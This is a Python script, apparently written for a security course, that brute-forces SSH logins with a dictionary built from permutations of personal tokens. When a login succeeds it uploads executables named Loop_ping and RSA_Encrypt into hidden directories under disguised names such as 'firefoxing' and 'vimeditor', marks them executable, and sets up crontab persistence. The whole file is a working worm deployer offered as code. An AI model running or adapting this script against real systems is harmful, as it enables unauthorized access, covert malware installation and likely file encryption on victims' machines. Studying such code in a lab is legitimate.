#!/usr/bin/env python
import sys
import time
import itertools
import paramiko

# build up the password dictionary
def Password_Cracking():
    x = ['YueHan','Wang','YH','1999','0228','oscar','Realtek','@','_']
    #x=['cs','123','2020']
    #x=['vic','tim']
    dictionary =[]
    for i in range(9):
        y = list(itertools.permutations(x, i + 1))
        for j in range(len(y)):
            password=""
            for k in range(i + 1):
                password+=y[j][k]
            dictionary.append(password)
    return dictionary

# try if the current password is right or not
def tryCredential(host, pw, sshClient):
    try:
        sshClient.connect(host, username='attacker', password=pw)
        return 0
    except paramiko.ssh_exception.AuthenticationException:
        return 1
    except paramiko.ssh_exception.SSHException:
        return 3

# get the authemtication of attacker
def SSH_Authentication(host, password_dict):
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
    for pw in password_dict:
        print("Testing "+pw+"...")
        result=tryCredential(host, pw, ssh)
        if result == 0:
            print ("---Successful authentication with password: " + pw+"---")
            return ssh
        elif result == 1:
            continue
        elif result == 3:
            while result == 3:
                print("Too much SSH trying... just wait 3 seconds...")
                time.sleep(3)
                print("re-Testing "+pw+"...")
                result=tryCredential(host, pw, ssh)
                if result == 0:
                    print ("---Successful authentication with password: " + pw+"---")
                    return ssh
                elif result == 1:
                    break
    return None

# propergate the worm
def Worm_Deployment(ssh):
    print("Start Propergating the Worm...")
    #build up the target directory
    ssh.exec_command("mkdir -p /home/attacker/Desktop/.Backup")
    ssh.exec_command("mkdir -p /home/attacker/Public/.Simple_Worm")
    ssh.exec_command("mkdir -p /home/attacker/.attackrecord/")
    ssh.exec_command("touch /home/attacker/.attackrecord/record.log")
    sftp = ssh.open_sftp()
    
    #sending Loop_ping
    remotepath='/home/attacker/Desktop/.Backup/firefoxing'
    localpath='./Loop_ping'
    sftp.put(localpath,remotepath)
    remotepath='/home/attacker/Public/.Simple_Worm/firefoxing'
    localpath='./Loop_ping'
    sftp.put(localpath,remotepath)
    ssh.exec_command("chmod u+x /home/attacker/Desktop/.Backup/firefoxing")
    ssh.exec_command("chmod u+x /home/attacker/Public/.Simple_Worm/firefoxing")

    #sending RSA_Encrypt
    remotepath='/home/attacker/Desktop/.Backup/vimeditor'
    localpath='./RSA_Encrypt'
    sftp.put(localpath,remotepath)
    remotepath='/home/attacker/Public/.Simple_Worm/vimeditor'
    localpath='./RSA_Encrypt'
    sftp.put(localpath,remotepath)
    ssh.exec_command("chmod u+x /home/attacker/Desktop/.Backup/vimeditor")
    ssh.exec_command("chmod u+x /home/attacker/Public/.Simple_Worm/vimeditor")

    #sending launch.py
    remotepath='/home/attacker/.attackrecord/launch.py'
    localpath='./launch.py'
    sftp.put(localpath,remotepath)

    print("---Successfully propergated---")

    print("Start configuring crontab...")
    #sending scheduling.py
    remotepath='/home/attacker/Desktop/.Backup/scheduling.py'
    localpath='./scheduling.py'
    sftp.put(localpath,remotepath)

    #installing crontab and executing scheduling.py
    ssh.exec_command("pip install python-crontab")
    ssh.exec_command("python /home/attacker/Desktop/.Backup/scheduling.py")
    print("---Successfully configured---")

# main funciton
def main():
    print("Start Deploying the Worm...")
    attacker_IP=str(sys.argv[1])
    print("Start Cracking the Password...")
    password_dict=Password_Cracking()
    print("There are "+ str(len(password_dict))+" passwords needed to be tried...")
    ssh=SSH_Authentication(attacker_IP,password_dict)
    if ssh == None:
        print("Dictionary attack failed... terminating the Program...")
        return
    Worm_Deployment(ssh)
    ssh.close()
    print("---Worm Deployed Successfully---")
    

if __name__=="__main__":
    main()